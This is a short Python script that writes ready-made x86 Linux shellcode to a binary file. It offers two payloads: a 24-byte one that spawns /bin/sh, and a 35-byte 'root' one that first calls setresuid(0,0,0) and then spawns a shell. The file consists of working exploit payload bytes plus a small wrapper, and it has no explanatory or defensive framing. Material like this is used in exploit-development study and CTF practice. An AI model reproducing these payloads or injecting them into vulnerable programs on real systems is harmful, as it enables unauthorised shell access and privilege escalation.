#! /usr/bin/env python3

"""Write x86 Linux shellcode bytes to a binary output file.

Usage:
    python3 x86-linux-sh.py <output_file> [user]

If "user" is provided as the second argument, user shellcode is written.
Otherwise, root shellcode is written by default.
"""

import sys

# x86/linux/exec user shellcode - 24 bytes
shellcode_user = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
    b"\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
)

# x86/linux/exec root shellcode - 35 bytes
shellcode_root = (
    b"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
    b"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
    b"\xe1\xcd\x80"
)


def main() -> int:
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <output_file> [user]")
        return 1

    output_file = sys.argv[1]
    use_user_shellcode = len(sys.argv) > 2 and sys.argv[2].lower() == "user"
    shellcode = shellcode_user if use_user_shellcode else shellcode_root

    with open(output_file, "wb") as fout:
        fout.write(shellcode)

    mode = "user" if use_user_shellcode else "root"
    print(f"Wrote {mode} shellcode to {output_file}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
